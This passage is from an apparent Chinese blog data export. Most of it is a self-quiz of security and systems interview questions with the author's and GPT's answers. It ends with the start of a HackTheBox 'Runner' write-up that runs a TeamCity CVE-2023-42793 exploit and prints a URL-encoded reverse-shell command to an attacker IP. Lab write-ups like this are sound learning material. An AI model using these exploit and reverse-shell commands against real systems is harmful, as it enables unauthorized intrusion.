`.github/workflows` 目录下定义的 YAML 文件配置工作流。每个工作流由触发器、作业和步骤组成。通过配置触发器（如 `push` 或 `pull_request`），指定在特定事件发生时自动执行作业，实现代码的持续集成（CI）和持续部署（CD）。\n* 在使用 Docker 时，如何创建并管理一个多容器应用？请说明 docker-compose 的基本用法。\n    多个容器之间一般会有启动先后的顺序，比如数据库先启动，web 服务后启动，此时通过 `depends_on` 标签控制，持久化部署也需要进行目录映射。\n    Docker Compose 用于定义和管理多容器 Docker 应用。使用 docker-compose.yml 文件定义服务、网络和卷。示例：\n\n    ```yaml\n    version: '3'\n    services:\n    db:\n        image: mysql\n        environment:\n        MYSQL_ROOT_PASSWORD: example\n    web:\n        image: nginx\n        depends_on:\n        - db\n        ports:\n        - \"80:80\"\n    ```\n\n    启动多容器应用：\n\n    ```sh\n    docker-compose up\n    ```\n\n可以看出 GPT 给的答案还是受了我的影响\n","slug":"GPT 面试官","published":1,"updated":"2024-06-02T07:07:19.923Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodb000l7slza8bk5taz","content":"<p>提前拷打自己。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Day-1\"><a href=\"#Day-1\" class=\"headerlink\" title=\"Day 1\"></a>Day 1</h2><ul>\n<li><p>请描述 <code>malloc</code> 和 <code>free</code> 的内部工作机制以及可能导致的内存泄漏问题。<br>  不会。<br>  GPT：<code>malloc</code> 是用来在堆上分配内存的函数，它会找到一块足够大的空闲内存块，然后标记为已使用并返回该内存块的指针。<code>free</code> 用来释放之前用 <code>malloc</code> 分配的内存，它将内存块标记为未使用，以便后续分配。内存泄漏问题是由于程序员忘记释放不再使用的内存，导致可用内存逐渐减少，最终可能耗尽内存资源</p>\n</li>\n<li><p>在 Python 中，如何处理多线程与多进程？它们之间有何区别？<br>  不会。<br>  GPT：在 Python 中，多线程可以使用 <code>threading</code> 模块，多进程可以使用 <code>multiprocessing</code> 模块。多线程适用于 I/O 密集型任务，而多进程适用于 CPU 密集型任务。主要区别在于多线程共享相同的内存空间，线程间通信开销较小，但由于 GIL（全局解释器锁）的存在，无法充分利用多核 CPU。而多进程每个进程有独立的内存空间，能够绕过 GIL，更好地利用多核 CPU，但进程间通信开销较大。</p>\n</li>\n<li><p>解释一下 Python 中的 GIL（全局解释器锁）是什么，以及它对多线程编程的影响。<br>  不会。<br>  GIL 是 Python 解释器用来保护访问 Python 对象的全局锁，确保同一时刻只有一个线程执行 Python 字节码。它的存在使得 Python 多线程在 CPU 密集型任务中无法提高执行效率，因为即使在多核处理器上，也只能有一个线程执行 Python 代码。这限制了 Python 在多线程 CPU 密集型任务中的并行执行能力。</p>\n</li>\n<li><p>在 Golang 中，如何进行并发编程？请举例说明。<br>  通过 goroutine。<br>  GPT：在 Golang 中，并发编程通过 <code>goroutine</code> 实现。<code>goroutine</code> 是轻量级线程，通过 <code>go</code> 关键字启动。示例代码：</p>\n  <figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">    <span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;time&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">say</span><span class=\"params\">(s <span class=\"type\">string</span>)</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i := <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++ &#123;</span><br><span class=\"line\">        time.Sleep(<span class=\"number\">100</span> * time.Millisecond)</span><br><span class=\"line\">        fmt.Println(s)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">go</span> say(<span class=\"string\">&quot;world&quot;</span>)</span><br><span class=\"line\">    say(<span class=\"string\">&quot;hello&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>  上述代码中，<code>say(&quot;world&quot;)</code> 通过 <code>goroutine</code> 并发执行。</p>\n</li>\n<li><p>请解释 x86 汇编中栈指针（ESP）和基址指针（EBP）的作用及其在函数调用中的使用。<br>  ESP 指向当前栈顶，基址指针指向栈底，函数调用时，把 EBP 压栈，再把 ESP 传到 EBP，ESP 指向新的地址。<br>  GPT：ESP（栈指针）指向当前栈顶，EBP（基址指针）通常指向当前栈帧的起始位置。在函数调用时，调用者会把当前的 EBP 压栈保存，随后 ESP 的值赋给 EBP，形成新的栈帧，ESP 指向新栈帧的栈顶。函数返回时，通过恢复 EBP 和 ESP 的值来返回到调用者的栈帧。</p>\n</li>\n<li><p>请解释 RSA 算法的基本原理，并描述一种常见的 RSA 攻击方式。<br>  RSA 的安全假设是基于大整数分解的困难性，原理基于欧拉定理；常见攻击方式有部分私钥泄露攻击，Coppersmith 即可恢复私钥。<br>  GPT：RSA 算法基于大整数分解的困难性。它使用两个大质数的乘积作为公钥，公钥加密消息后只能用对应的私钥解密。常见的 RSA 攻击方式包括基于部分私钥泄露的攻击，例如 Coppersmith 攻击，这种攻击可以在已知部分私钥的情况下恢复完整私钥。</p>\n</li>\n<li><p>如何实现一个安全的随机数生成器？请讨论常见的伪随机数生成器的安全性问题。<br>  使其达到 m-序列；常见伪随机数生成器均为线性，已经一部分序列容易恢复全部序列。<br>  GPT：安全的随机数生成器通常基于硬件随机数生成器或密码学安全算法，如 CryptGenRandom（Windows）或 /dev/random（Linux）。常见的伪随机数生成器（PRNG）如 rand() 基于线性同余生成器，安全性较差，容易预测，安全性不高。密码学安全的 PRNG（CSPRNG）如 openssl 提供的随机数生成器使用复杂的算法确保不可预测性。</p>\n</li>\n<li><p>请描述如何使用 IDA Pro 进行静态分析，并解释其在逆向工程中的作用。<br>  IDA 的插件可以直接生成 C 的伪代码，可以对其伪代码进行逆向分析。<br>  GPT：IDA Pro 是一款强大的反汇编工具，用于将二进制代码转换为可读的汇编代码或伪代码。它可以通过插件生成 C 的伪代码，便于理解程序逻辑。在逆向工程中，IDA Pro 通过静态分析帮助分析二进制文件的结构、函数调用关系和代码流程，从而理解和修改程序。</p>\n</li>\n<li><p>请举例说明如何利用 GDB 进行动态调试，以及在调试过程中常见的陷阱和解决方法。<br>  不会。<br>  GDB 是 GNU 的调试器，用于调试 C 和 C++ 程序。常见的使用方法包括：</p>\n  <figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb ./program</span><br></pre></td></tr></table></figure>\n\n<p>  启动程序并设置断点：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">break main</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p>  查看变量值：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print variable</span><br></pre></td></tr></table></figure>\n\n<p>  单步执行：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">next</span><br><span class=\"line\">step</span><br></pre></td></tr></table></figure>\n\n<p>  常见陷阱包括多线程调试时难以同步线程、优化编译后的代码难以调试等。解决方法是使用 GDB 提供的线程命令和编译时关闭优化选项。</p>\n</li>\n<li><p>什么是栈溢出漏洞？请解释如何通过 ROPgadget 工具进行 ROP（返回导向编程）攻击。<br>  栈溢出漏洞是指变量在栈上空间分配不足，写入数据越过了变量的栈空间覆盖到其他数据，常见覆盖返回地址，从而劫持程序流；ROPgadget 可以查找程序中存在的 pop 和 ret 指令，通过这些指令可以劫持流。<br>  GPT：栈溢出漏洞是指程序将数据写入栈时超过预期长度，覆盖了其他数据，尤其是返回地址，从而劫持程序流。ROPgadget 工具用于查找程序中现有的 <code>pop</code> 和 <code>ret</code> 指令，通过这些指令片段（gadget）链式组合，实现复杂的恶意行为而不需要插入新代码，从而绕过不可执行栈保护（NX bit）。</p>\n</li>\n<li><p>请描述堆溢出漏洞的原理，并举例说明如何利用该漏洞进行攻击。<br>  不会。<br>  GPT：堆溢出漏洞是指程序在堆上分配内存时超过了分配的边界，覆盖了其他内存区域。攻击者可以利用该漏洞修改程序控制数据或函数指针，导致执行任意代码。示例攻击包括利用堆溢出修改函数指针，使其指向恶意代码，从而执行任意命令。</p>\n</li>\n<li><p>请解释如何使用 Burp Suite 进行 Web 应用程序的漏洞扫描。<br>  一般不使用 BP 扫漏洞。<br>  Burp Suite 是一款用于 Web 安全测试的综合工具。其漏洞扫描器模块可以自动发现常见的 Web 应用漏洞，如 SQL 注入、跨站脚本（XSS）等。使用方法包括设置代理拦截 HTTP 流量，进行主动或被动扫描，分析结果并生成报告。</p>\n</li>\n<li><p>在渗透测试中，如何使用 Nmap 进行网络探测？请解释常用的 Nmap 扫描类型及其用途。<br>  一般加参数 <code>-F</code> 扫常见端口，再 <code>-p-</code> 全端口扫描，<code>-sS</code> 查看端口上运行的服务详情。<br>  GPT：Nmap 是一款网络扫描工具，用于发现网络上的设备和服务。常用扫描类型包括：<br>  -sS（SYN 扫描）：快速隐蔽扫描，适用于发现开放端口。<br>  -sT（TCP 连接扫描）：完全连接扫描，适用于详细服务信息获取。<br>  -sU（UDP 扫描）：扫描 UDP 端口，发现 UDP 服务。<br>  -O（操作系统检测）：识别远程主机的操作系统。</p>\n</li>\n<li><p>请描述你在 Linux 系统中常用的系统管理命令及其功能。<br>  <code>ls</code> 查看目录下文件，<code>nano</code> 编辑文件，<code>df</code> 查看磁盘，<code>pwd</code> 当前目录。<br>  GPT:常用的 Linux 系统管理命令包括：<br>  ls：列出目录内容。<br>  nano：轻量级文本编辑器。<br>  df：显示文件系统的磁盘空间使用情况。<br>  pwd：打印当前工作目录。</p>\n</li>\n<li><p>在 Linux 环境下，如何设置并管理一个 Nginx 服务器？<br>  设置在 nginx.conf 里；不太会。<br>  GPT：设置和管理 Nginx 服务器包括编辑配置文件 <code>nginx.conf</code>，设置服务器块（server blocks）定义虚拟主机，配置反向代理、负载均衡和 SSL。启动、停止和重启 Nginx 服务器使用以下命令：</p>\n  <figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo systemctl start nginx</span><br><span class=\"line\">sudo systemctl stop nginx</span><br><span class=\"line\">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure></li>\n<li><p>请解释 GitHub Actions 的工作原理，并描述如何通过 GitHub Actions 实现 CI/CD。<br>  通过 .workflow 下设定的工作流实现自动化，可以指定环境，编译代码和发布版本。<br>  GPT：GitHub Actions 通过 <code>.github/workflows</code> 目录下定义的 YAML 文件配置工作流。每个工作流由触发器、作业和步骤组成。通过配置触发器（如 <code>push</code> 或 <code>pull_request</code>），指定在特定事件发生时自动执行作业，实现代码的持续集成（CI）和持续部署（CD）。</p>\n</li>\n<li><p>在使用 Docker 时，如何创建并管理一个多容器应用？请说明 docker-compose 的基本用法。<br>  多个容器之间一般会有启动先后的顺序，比如数据库先启动，web 服务后启动，此时通过 <code>depends_on</code> 标签控制，持久化部署也需要进行目录映射。<br>  Docker Compose 用于定义和管理多容器 Docker 应用。使用 docker-compose.yml 文件定义服务、网络和卷。示例：</p>\n  <figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">db:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">mysql</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">    <span class=\"attr\">MYSQL_ROOT_PASSWORD:</span> <span class=\"string\">example</span></span><br><span class=\"line\"><span class=\"attr\">web:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\">    <span class=\"attr\">depends_on:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">db</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;80:80&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>  启动多容器应用：</p>\n  <figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>可以看出 GPT 给的答案还是受了我的影响</p>\n","excerpt":"<p>提前拷打自己。</p>","more":"<h2 id=\"Day-1\"><a href=\"#Day-1\" class=\"headerlink\" title=\"Day 1\"></a>Day 1</h2><ul>\n<li><p>请描述 <code>malloc</code> 和 <code>free</code> 的内部工作机制以及可能导致的内存泄漏问题。<br>  不会。<br>  GPT：<code>malloc</code> 是用来在堆上分配内存的函数，它会找到一块足够大的空闲内存块，然后标记为已使用并返回该内存块的指针。<code>free</code> 用来释放之前用 <code>malloc</code> 分配的内存，它将内存块标记为未使用，以便后续分配。内存泄漏问题是由于程序员忘记释放不再使用的内存，导致可用内存逐渐减少，最终可能耗尽内存资源</p>\n</li>\n<li><p>在 Python 中，如何处理多线程与多进程？它们之间有何区别？<br>  不会。<br>  GPT：在 Python 中，多线程可以使用 <code>threading</code> 模块，多进程可以使用 <code>multiprocessing</code> 模块。多线程适用于 I/O 密集型任务，而多进程适用于 CPU 密集型任务。主要区别在于多线程共享相同的内存空间，线程间通信开销较小，但由于 GIL（全局解释器锁）的存在，无法充分利用多核 CPU。而多进程每个进程有独立的内存空间，能够绕过 GIL，更好地利用多核 CPU，但进程间通信开销较大。</p>\n</li>\n<li><p>解释一下 Python 中的 GIL（全局解释器锁）是什么，以及它对多线程编程的影响。<br>  不会。<br>  GIL 是 Python 解释器用来保护访问 Python 对象的全局锁，确保同一时刻只有一个线程执行 Python 字节码。它的存在使得 Python 多线程在 CPU 密集型任务中无法提高执行效率，因为即使在多核处理器上，也只能有一个线程执行 Python 代码。这限制了 Python 在多线程 CPU 密集型任务中的并行执行能力。</p>\n</li>\n<li><p>在 Golang 中，如何进行并发编程？请举例说明。<br>  通过 goroutine。<br>  GPT：在 Golang 中，并发编程通过 <code>goroutine</code> 实现。<code>goroutine</code> 是轻量级线程，通过 <code>go</code> 关键字启动。示例代码：</p>\n  <figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">    <span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;time&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">say</span><span class=\"params\">(s <span class=\"type\">string</span>)</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i := <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++ &#123;</span><br><span class=\"line\">        time.Sleep(<span class=\"number\">100</span> * time.Millisecond)</span><br><span class=\"line\">        fmt.Println(s)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">go</span> say(<span class=\"string\">&quot;world&quot;</span>)</span><br><span class=\"line\">    say(<span class=\"string\">&quot;hello&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>  上述代码中，<code>say(&quot;world&quot;)</code> 通过 <code>goroutine</code> 并发执行。</p>\n</li>\n<li><p>请解释 x86 汇编中栈指针（ESP）和基址指针（EBP）的作用及其在函数调用中的使用。<br>  ESP 指向当前栈顶，基址指针指向栈底，函数调用时，把 EBP 压栈，再把 ESP 传到 EBP，ESP 指向新的地址。<br>  GPT：ESP（栈指针）指向当前栈顶，EBP（基址指针）通常指向当前栈帧的起始位置。在函数调用时，调用者会把当前的 EBP 压栈保存，随后 ESP 的值赋给 EBP，形成新的栈帧，ESP 指向新栈帧的栈顶。函数返回时，通过恢复 EBP 和 ESP 的值来返回到调用者的栈帧。</p>\n</li>\n<li><p>请解释 RSA 算法的基本原理，并描述一种常见的 RSA 攻击方式。<br>  RSA 的安全假设是基于大整数分解的困难性，原理基于欧拉定理；常见攻击方式有部分私钥泄露攻击，Coppersmith 即可恢复私钥。<br>  GPT：RSA 算法基于大整数分解的困难性。它使用两个大质数的乘积作为公钥，公钥加密消息后只能用对应的私钥解密。常见的 RSA 攻击方式包括基于部分私钥泄露的攻击，例如 Coppersmith 攻击，这种攻击可以在已知部分私钥的情况下恢复完整私钥。</p>\n</li>\n<li><p>如何实现一个安全的随机数生成器？请讨论常见的伪随机数生成器的安全性问题。<br>  使其达到 m-序列；常见伪随机数生成器均为线性，已经一部分序列容易恢复全部序列。<br>  GPT：安全的随机数生成器通常基于硬件随机数生成器或密码学安全算法，如 CryptGenRandom（Windows）或 /dev/random（Linux）。常见的伪随机数生成器（PRNG）如 rand() 基于线性同余生成器，安全性较差，容易预测，安全性不高。密码学安全的 PRNG（CSPRNG）如 openssl 提供的随机数生成器使用复杂的算法确保不可预测性。</p>\n</li>\n<li><p>请描述如何使用 IDA Pro 进行静态分析，并解释其在逆向工程中的作用。<br>  IDA 的插件可以直接生成 C 的伪代码，可以对其伪代码进行逆向分析。<br>  GPT：IDA Pro 是一款强大的反汇编工具，用于将二进制代码转换为可读的汇编代码或伪代码。它可以通过插件生成 C 的伪代码，便于理解程序逻辑。在逆向工程中，IDA Pro 通过静态分析帮助分析二进制文件的结构、函数调用关系和代码流程，从而理解和修改程序。</p>\n</li>\n<li><p>请举例说明如何利用 GDB 进行动态调试，以及在调试过程中常见的陷阱和解决方法。<br>  不会。<br>  GDB 是 GNU 的调试器，用于调试 C 和 C++ 程序。常见的使用方法包括：</p>\n  <figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb ./program</span><br></pre></td></tr></table></figure>\n\n<p>  启动程序并设置断点：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">break main</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p>  查看变量值：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print variable</span><br></pre></td></tr></table></figure>\n\n<p>  单步执行：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">next</span><br><span class=\"line\">step</span><br></pre></td></tr></table></figure>\n\n<p>  常见陷阱包括多线程调试时难以同步线程、优化编译后的代码难以调试等。解决方法是使用 GDB 提供的线程命令和编译时关闭优化选项。</p>\n</li>\n<li><p>什么是栈溢出漏洞？请解释如何通过 ROPgadget 工具进行 ROP（返回导向编程）攻击。<br>  栈溢出漏洞是指变量在栈上空间分配不足，写入数据越过了变量的栈空间覆盖到其他数据，常见覆盖返回地址，从而劫持程序流；ROPgadget 可以查找程序中存在的 pop 和 ret 指令，通过这些指令可以劫持流。<br>  GPT：栈溢出漏洞是指程序将数据写入栈时超过预期长度，覆盖了其他数据，尤其是返回地址，从而劫持程序流。ROPgadget 工具用于查找程序中现有的 <code>pop</code> 和 <code>ret</code> 指令，通过这些指令片段（gadget）链式组合，实现复杂的恶意行为而不需要插入新代码，从而绕过不可执行栈保护（NX bit）。</p>\n</li>\n<li><p>请描述堆溢出漏洞的原理，并举例说明如何利用该漏洞进行攻击。<br>  不会。<br>  GPT：堆溢出漏洞是指程序在堆上分配内存时超过了分配的边界，覆盖了其他内存区域。攻击者可以利用该漏洞修改程序控制数据或函数指针，导致执行任意代码。示例攻击包括利用堆溢出修改函数指针，使其指向恶意代码，从而执行任意命令。</p>\n</li>\n<li><p>请解释如何使用 Burp Suite 进行 Web 应用程序的漏洞扫描。<br>  一般不使用 BP 扫漏洞。<br>  Burp Suite 是一款用于 Web 安全测试的综合工具。其漏洞扫描器模块可以自动发现常见的 Web 应用漏洞，如 SQL 注入、跨站脚本（XSS）等。使用方法包括设置代理拦截 HTTP 流量，进行主动或被动扫描，分析结果并生成报告。</p>\n</li>\n<li><p>在渗透测试中，如何使用 Nmap 进行网络探测？请解释常用的 Nmap 扫描类型及其用途。<br>  一般加参数 <code>-F</code> 扫常见端口，再 <code>-p-</code> 全端口扫描，<code>-sS</code> 查看端口上运行的服务详情。<br>  GPT：Nmap 是一款网络扫描工具，用于发现网络上的设备和服务。常用扫描类型包括：<br>  -sS（SYN 扫描）：快速隐蔽扫描，适用于发现开放端口。<br>  -sT（TCP 连接扫描）：完全连接扫描，适用于详细服务信息获取。<br>  -sU（UDP 扫描）：扫描 UDP 端口，发现 UDP 服务。<br>  -O（操作系统检测）：识别远程主机的操作系统。</p>\n</li>\n<li><p>请描述你在 Linux 系统中常用的系统管理命令及其功能。<br>  <code>ls</code> 查看目录下文件，<code>nano</code> 编辑文件，<code>df</code> 查看磁盘，<code>pwd</code> 当前目录。<br>  GPT:常用的 Linux 系统管理命令包括：<br>  ls：列出目录内容。<br>  nano：轻量级文本编辑器。<br>  df：显示文件系统的磁盘空间使用情况。<br>  pwd：打印当前工作目录。</p>\n</li>\n<li><p>在 Linux 环境下，如何设置并管理一个 Nginx 服务器？<br>  设置在 nginx.conf 里；不太会。<br>  GPT：设置和管理 Nginx 服务器包括编辑配置文件 <code>nginx.conf</code>，设置服务器块（server blocks）定义虚拟主机，配置反向代理、负载均衡和 SSL。启动、停止和重启 Nginx 服务器使用以下命令：</p>\n  <figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo systemctl start nginx</span><br><span class=\"line\">sudo systemctl stop nginx</span><br><span class=\"line\">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure></li>\n<li><p>请解释 GitHub Actions 的工作原理，并描述如何通过 GitHub Actions 实现 CI/CD。<br>  通过 .workflow 下设定的工作流实现自动化，可以指定环境，编译代码和发布版本。<br>  GPT：GitHub Actions 通过 <code>.github/workflows</code> 目录下定义的 YAML 文件配置工作流。每个工作流由触发器、作业和步骤组成。通过配置触发器（如 <code>push</code> 或 <code>pull_request</code>），指定在特定事件发生时自动执行作业，实现代码的持续集成（CI）和持续部署（CD）。</p>\n</li>\n<li><p>在使用 Docker 时，如何创建并管理一个多容器应用？请说明 docker-compose 的基本用法。<br>  多个容器之间一般会有启动先后的顺序，比如数据库先启动，web 服务后启动，此时通过 <code>depends_on</code> 标签控制，持久化部署也需要进行目录映射。<br>  Docker Compose 用于定义和管理多容器 Docker 应用。使用 docker-compose.yml 文件定义服务、网络和卷。示例：</p>\n  <figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">db:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">mysql</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">    <span class=\"attr\">MYSQL_ROOT_PASSWORD:</span> <span class=\"string\">example</span></span><br><span class=\"line\"><span class=\"attr\">web:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\">    <span class=\"attr\">depends_on:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">db</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;80:80&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>  启动多容器应用：</p>\n  <figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>可以看出 GPT 给的答案还是受了我的影响</p>"},{"title":"HackTheBox 笔记 - 2","date":"2024-06-04T05:52:00.000Z","_content":"\n不得不找饭吃了。\nTwo Million / Mailing / BoardLight / Usage\n\n<!--more-->\n\n## Runner\n\n扫端口，有 22，80，8000，访问 80 发现是个静态网页，dirsearch 也没扫出东西，再扫 8000，只有个 `/health` 和 `/version` 路由，也没什么用。\n再扫子域名，也没扫出来东西，一看 wp 原来人家用的超大字典，晕\n\n```bash\nwfuzwfuzz -c -w  /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u \"http://runner.htb\" -H \"Host:FUZZ.runner.htb\" --hw 10\n```\n\n于是就扫出来 `teamcity.runner.htb`，访问，是个 TeamCity。搜一下 CVE：\n\n```bash\n$ searchsploit teamcity\n------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                   |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nJetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                              | java/remote/47891.txt\nJetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                       | java/remote/51884.py\nTeamCity < 9.0.2 - Disabled Registration Bypass                                                                                                  | multiple/remote/46514.js\nTeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                          | multiple/remote/45917.rb\nTeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                              | php/webapps/48201.py\n------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n\n网页写着 `Version 2023.05.3 (build 129390)`，这不正好是 CVE-2023-42793，直接 `searchsploit -p java/remote/51884.py` 找到 PoC 的位置，然后复制过来跑\n\n```bash\n$ python 51884.py -u http://teamcity.runner.htb\n\n=====================================================\n*       CVE-2023-42793                              *\n*  TeamCity Admin Account Creation                  *\n*                                                   *\n*  Author: ByteHunter                               *\n=====================================================\n\nToken: eyJ0eXAiOiAiVENWMiJ9.SXpoSWFONE1EaGJ3SmowbGxLMmNfSmlaZkZV.NzU0ZDU4NzYtNzU3My00ZTgwLWFmNWMtMGIyNjliZjY0ZDkw\nSuccessfully exploited!\nURL: http://teamcity.runner.htb\nUsername: city_adminOpx8\nPassword: Main_password!!**\n```\n\n把 Token 存到文件 `token`，然后执行这个 [PoC](https://github.com/Zyad-Elsayed/CVE-2023-42793/blob/main/rce.py)\n\n```bash\npython rce.py -u http://teamcity.runner.htb -t token -c '\"/bin/bash\"&params=\"-c\"&params=\"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.18%2F55555%200%3E%261\"'\n```\n\n然后就拿到 shell 了，得到第一个 flag。注意这里是 docker 的 shell，执行 `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` 换个 shell（不知道和直接 `bash` 有啥区别），传 `linpeas.sh` 